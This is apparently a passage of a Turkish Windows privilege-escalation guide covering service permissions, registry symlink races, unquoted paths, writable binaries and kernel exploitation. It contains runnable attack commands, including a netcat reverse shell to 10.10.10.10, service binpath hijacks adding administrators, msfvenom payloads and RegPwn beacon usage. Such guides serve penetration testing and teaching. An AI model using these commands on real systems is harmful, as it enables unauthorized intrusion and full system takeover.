**Bu soruna yönelik başka bir geçici çözüm**, şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis binary path'ini değiştirme**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin yürütülebilir binary dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

İzinler çeşitli yollarla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Hizmet ikili dosyasının yeniden yapılandırılmasına olanak tanır.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve hizmet yapılandırmalarını değiştirme olanağı verir.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Hizmet yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Hizmet yapılandırmalarını değiştirme yeteneğini de devralır.

Bu güvenlik açığının tespiti ve exploit edilmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Hizmet ikili dosyalarının zayıf izinleri

Bir hizmet **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa; ancak **düşük ayrıcalıklı kullanıcılar hizmetin EXE dosyasını veya üst klasörünü değiştirebiliyorsa**, hizmet çoğu zaman **ikili dosya değiştirilip hizmet yeniden başlatılarak** ele geçirilebilir.

**Bir hizmet tarafından çalıştırılan ikili dosyayı değiştirip değiştiremeyeceğinizi** veya ikili dosyanın bulunduğu **klasörde yazma izniniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Bir hizmet tarafından çalıştırılan tüm ikili dosyaları **wmic** kullanarak (system32 içinde olmayanları) listeleyebilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet yürütülebilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` komutuyla hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` komutuyla dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` komutuyla hizmeti yeniden başlatın (veya sistemin yeniden başlatılmasını / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Servis normal bir kullanıcının onu yeniden başlatmasına izin vermiyorsa, önyükleme sırasında otomatik başlayıp başlamadığını, yeniden başlatan bir failure action olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Servis kayıt defteri üzerinde değişiklik izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Özgün izin testi şöyle ifade edilmişti:

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, servis tarafından yürütülen binary değiştirilebilir.

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun belirli bir servis anahtarı üzerinde yazma yetkisi veren registry izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry anahtarı izinleri, servis nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Privilege escalation için ayrıca kullanılabilir bir servis yapılandırma alanı, servisi tetikleme yöntemi ve daha yüksek ayrıcalıklara sahip bir servis kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Yürütülen binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Kayıt defteri symlink yarışıyla rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Kayıt defterinde **sembolik bağlantı yarışı**, ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değer yazma** ilkeli sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig** içine yerleştirin.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **yarışı kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefine işaret eden bir **kayıt defteri bağlantısıyla** değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değer yazma elde ettikten sonra hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra tetikleyin. **Not:** Genel exploit uygulaması, yarışın bir parçası olarak iş istasyonunu kilitler.

Örnek araçlar (RegPwn BOF / bağımsız):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahip olmanız, **bu registry altında alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **keyfi kod çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak içine alınmamışsa, Windows boşluk içeren her konumda yolun o noktaya kadar olan kısmını çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını metasploit ile tespit edip exploit edebilirsiniz**: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir service binary oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik, bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla bilgi için [resmî belgelere](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görevde, `cmd.exe` ile birlikte **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. PowerShell `-File` gibi bir yorumlayıcının açık dosya bağımsız değişkeni kullanıldığı durumlarda da aynı kural geçerlidir. Zamanlanmış bir batch dosyasında doğrudan bir PowerShell `-File` çağrısı varsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullar ve kabuk zincirleri elle izlenmelidir. Çağıran hesabın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten ilgili eyleme ulaşıyorsa hesaplar arası yürütme olasılığına işaret eder. Betiklerde yalnızca sona eklemeye izin veren bir ACL önemli olabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların çalışmasını engelleyebilir. Privilege escalation olduğunu öne sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma sırasında betiği değiştirmeyin veya görevi başlatmayın.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosya, içeriği sıradan dizin listelemesinde gösterilmeyen adlandırılmış bir `:$DATA` akışına sahip olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, herhangi bir içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunlara [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'de [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) aracılığıyla erişim sağlar. Gizli bilgiye işaret eden bir akış adı yalnızca bir ipucudur. Dosyanın etkin okuma izinlerini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu bilgilerin hangi hesapta kimlik doğrulaması yaptığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Ayrıcalıklı bir hesapla bu yardımcı programı başlatan zamanlanmış bir görev veya hizmet, yardımcı programın çalıştırılabilir dosyası korumalı olsa bile bu girdi dosyalarına düşük ayrıcalıklı yazma erişiminin ilgili hesabın bağlamında komut yürütmeye dönüşmesine neden olabilir. Yardımcı programın yanı sıra **her iki** ek dosyanın da oluşturulabildiğini veya değiştirilebildiğini ve ayrıcalıklı bir tüketicinin bulunduğunu doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki ek dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, çalıştırılabilir dosyanın bulunduğu dizin doğrulanması gereken bir ipucudur; görevin girdilerini nereden okuduğunun kanıtı değildir. Proje çalışma dosyası ön koşulunun da sağlanması gerekir. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (birini üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` içine yazan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent'larını etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, sistemin etkilenip etkilenmediğini gösteremez. Envanter çıkarma işlemi, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus build 6210 ve önceki sürümleri etkiledi; üretici sorunu build 6211'de düzeltti. Bu sorun yalnızca SAML SSO **etkinse veya daha önce etkinleştirildiyse** önemlidir. Bu nedenle yüklü ürün kaydı veya hizmet yolu bir bulgudur, ancak tek başına güvenlik açığının kanıtı değildir: tam build'i, SAML yapılandırma geçmişini, hizmetin ağdan erişilebilirliğini ve çalıştığı hesabı doğrulayın. Hizmet üzerinden kod yürütme, o hesabın ayrıcalıklarını kullanır; SYSTEM olarak yürütme için örneğin SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` bulunması, ayrı bir şifreli yedek bulgusudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin envanter çıkarma sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Bir Windows Jenkins controller'ında, bir iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeler](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir, ancak bunun etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Yürütme, controller'ın veya seçilen agent'ın kimliğiyle gerçekleşir; kayıtlı bir kimlik bilgisi yalnızca iş ilgili kapsamda ona erişebiliyorsa kullanılabilir. Ayrıca `JENKINS_HOME` meta verilerine erişimi inceleyin: Jenkins, kimlik bilgisi materyallerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına bir parolayı açığa çıkarmaz; gizli bilgileri paylaşılan çıktılara yazdırmadan **gerekli dosyalara okuma erişimini** ve hesaptan yeniden kullanım için ayrı bir yolu doğrulayın. Bu hesabın bir AD kullanıcı nesnesinin `scriptPath` alanında yazma hakkı varsa, bunu kullanıcılar arası yürütme olarak değerlendirmeden önce yazılabilir bir betik yolunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış tüketici sürecini doğrulayın. Daha fazla grup denetimi için etkin AD hakları ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Bir Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini pipeline'ı **kuyruğa alma** ve seçilen agent havuzunu kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [havuz yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) birbirinden bağımsız olarak belgeler. Daha düşük ayrıcalıklı bir hesap bir script adımı gönderebilir ve bu pipeline'ı self-hosted bir Windows agent üzerinde çalıştırabilirse, adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Kullanıcılar arası veya SYSTEM geçişi olduğunu ileri sürmeden önce tam pipeline'ı, branch/kaynak kısıtlamalarını, yetkilendirilmiş havuzu, çalıştırılabilir işi ve agent hizmetinin kimliğini doğrulayın. Yüklü bir agent, proje rolü veya depoya yazma izni tek başına yalnızca bir bulgudur; pasif envanter çıkarma sırasında build başlatmadan izinleri ve yerel hizmet meta verilerini inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) senkronizasyon hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabı** ile dizin izinleri yapılandırılmış senkronizasyon özelliklerine bağlı olan **AD DS connector hesabını** birbirinden ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali ise [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir sync hizmeti, yerel yönetici izlenimi veren bir grup veya yalnızca veritabanının görülebilir olması, çözülebilir bir kimlik bilgisini ya da domain ayrıcalık yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter çıkarma yalnızca hizmet ve erişim meta verilerini göstermeli; kayıtlı gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Yazıcı driver destek DLL izinleri

Yüklü bir yazıcı driver'ı destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print sürecinde yükleyebilir. Yazıcı WMI envanter sorgusu reddedilse bile üst dizinler ve reparse point'ler dahil olmak üzere tam driver dizininin ve DLL ACL'lerinin izinlerini inceleyin. [Ricoh yazıcı driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [orijinal açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/), `PrintIsolationHost.exe` tarafından DLL yüklenmesini açıklar. Yazılabilir bir ACL yalnızca bir bulgudur: engelleme girdileri hesaba katıldıktan sonra etkin yazma erişimini, ilgili driver'ın yüklü olup olmadığını ve dosyayı ayrıcalıklı bir kimlikle yükleyip yüklemediğini ve üreticinin güncel driver'ının veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Özel dosyaları okumak için bazı yapılandırma dosyalarını değiştirebilip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ eklentilerinin otomatik yüklenmesiyle kalıcılık/çalıştırma

Notepad++, `plugins` alt klasörlerindeki tüm eklenti DLL’lerini otomatik yükler. Yazılabilir taşınabilir/kopya bir kurulum varsa, kötü amaçlı bir eklenti eklemek her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve eklenti callback’leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir kayıt defteri girdisinin veya ikili dosyanın üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici otomatik çalıştırma konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf, şüpheli/açık içeren** sürücüleri arayın.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında sık görülür), doğrudan kernel belleğinden bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

İlgili Windows kernel exploitation materyali:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Güvenlik açığı bulunan çağrının saldırgan denetimindeki bir Object Manager yolunu açtığı race-condition hatalarında, arama işlemini bilerek yavaşlatmak (maksimum uzunlukta bileşenler veya derin dizin zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool ifşaları ve I/O ring pivotları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki hatadan oluşturulabilir: kuyruk kilidi hâlâ tutulurken bir isteği/CBD'yi serbest bırakan **cancel-safe queue yaşam süresi yarışı** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool ayırmasını leak eden **kopyalamadan önce kilidin bırakılması** ifşası.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Kilit altındayken serbest bırakma + ardından cancel**: başarı yolunun **Acquire -> CompleteRequest/free -> Release** yaptığı, cancel yolunun ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Başarı yolu, CBDQ/CSQ kilidini bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` işlevine ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bloke olmuş bir thread sonradan devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA` işaretçisini sürücünün remove callback'ine iletebilir.
- Serbest bırakılan kuyruk nesnesini aynı boyutta, saldırgan denetimindeki bir paged-pool ayırmasıyla **yeniden kullanıma alın**. `NPFS` Data Queue Entries yararlıdır; çünkü payload ve boyut denetlenebilir, ayrıca bunlar pipe read/peek işlemleriyle sonradan incelenebilir. Serbest bırakılan nesne liste bağlantıları içeriyorsa, bunları **kullanıcı belleğindeki sahte istek düğümlerinden oluşan döngüsel bir listeyle** üzerine yazın. Böylece sürücü, özgün liste başında sonlanmak yerine saldırganın tanımladığı istek yapılarını tekrar tekrar işler.
- **Öngörülebilir bir yazmayı daha etkili hâle getirin**: sahte istek, bookkeeping yazmalarında kullanılan (timestamp / QPC / refcount bitişiğindeki alanlar) iç içe bir context işaretçisini başka yere yönlendirirse, **adresi denetlenebilir ama değeri denetlenemeyen** bir kernel yazması elde edebilirsiniz. Bu durumda son bir code/data işaretçisi yerine, spray edilen pool nesnesinin **length/size** alanını hedefleyin; ardından bozulmuş nesne sınırların dışındaki bir paged-pool read işlemi sağlayana kadar spray'i tarayın.
- **Yarış koşuluna açık ifşa kalıbı**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın son ayırmasının boyutunu artıran çok sayıda liste/kaynak girdisi ekleyerek), güvenilirlik artar. Çünkü daha uzun bir kopyalama, makinenin çökmesine yol açmadan değiştirme penceresini genişletir.
- **İşaretçi içeriği zengin yeniden doldurma hedefleri**: Windows **I/O ring** kayıtlı buffer dizileri, paged-pool boyutu saldırgan tarafından denetlenebildiği (`8 * regBufferCnt`) ve her öğe bir `_IOP_MC_BUFFER_ENTRY` kernel işaretçisi olduğu için mükemmel ifşa hedefleridir. Bu dizilerden birini leak edin, çevresindeki `IORING_OBJECT` yapısını bulun, ardından **`RegBuffers`** ve **`RegBuffersCount`** alanlarını bozun. Böylece sonraki I/O ring işlemleri saldırganın sahtelediği girdileri kullanarak keyfi kernel read/write sağlayabilir. Kullanılabilir tek yazma işlemi kararlı bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` değerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir kullanıcı işaretçisi oluşturmak için **hizalanmamış yazmaları üst üste bindirin**, bunu `VirtualAlloc` ile eşleyin ve sahte kayıtlı-buffer dizisini bu adrese yerleştirin.<sup>[[30]](#references)</sup>

Yararlı hata ayıklama göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring’den arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow’u kullanarak bir SYSTEM token’ı çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive zafiyetleri, deterministik layout’lar oluşturmanıza, yazılabilir HKLM/HKU alt öğelerini kötüye kullanmanıza ve metadata corruption’ı özel bir driver olmadan kernel paged-pool overflow’larına dönüştürmenize olanak tanır. Tüm zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

